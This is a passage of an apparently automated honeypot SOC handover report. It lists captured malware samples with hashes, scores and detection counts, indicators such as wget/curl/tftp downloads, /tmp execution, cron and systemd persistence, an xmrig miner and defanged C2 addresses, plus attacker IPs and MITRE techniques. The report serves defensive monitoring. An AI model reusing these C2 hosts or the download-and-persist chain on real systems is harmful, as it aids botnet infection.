| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.130.123[.]176` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 3 |
| `202.46.68[.]96` | ID | PT Indonesia Comnets Plus | **100** ⚠️ | 2 |
| `211.194.52[.]6` | KR | Korea Telecom | **100** ⚠️ | 10 |
| `202.165.22[.]173` | MY | TM ONE Cloud Alpha Edge | **100** ⚠️ | 12 |
| `102.212.40[.]231` | NG | Connect, Surf and Smile Limited | **100** ⚠️ | 13 |
| `106.251.244[.]178` | KR | LG DACOM Corporation | **100** ⚠️ | 50 |
| `152.32.191[.]130` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 1 |
| `173.212.216[.]242` | FR | Contabo GmbH | **100** ⚠️ | 1 |
| `50.6.207[.]74` | US | Newfold Digital, Inc. | **100** ⚠️ | 2 |
| `36.212.31[.]122` | CN | China Mobile Communications Group Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 494 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 440 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 205 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 151 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 62 |

---

## 🔕 False Positive Summary (98 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 25 |
| AbuseIPDB score 1 below threshold 25 | 7 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 4 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 48 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 707 cases |
| Tool 34  | Credential Extractor        | ✅ 7642 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 34 fingerprints |
| Tool 36  | Command Clustering          | ✅ 80 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 391 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 98 filtered (13.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 168 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 435 priority case(s) shown individually · 156 recon entry/entries in table (16 group(s) consolidating 34 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-26T17:54:17Z_
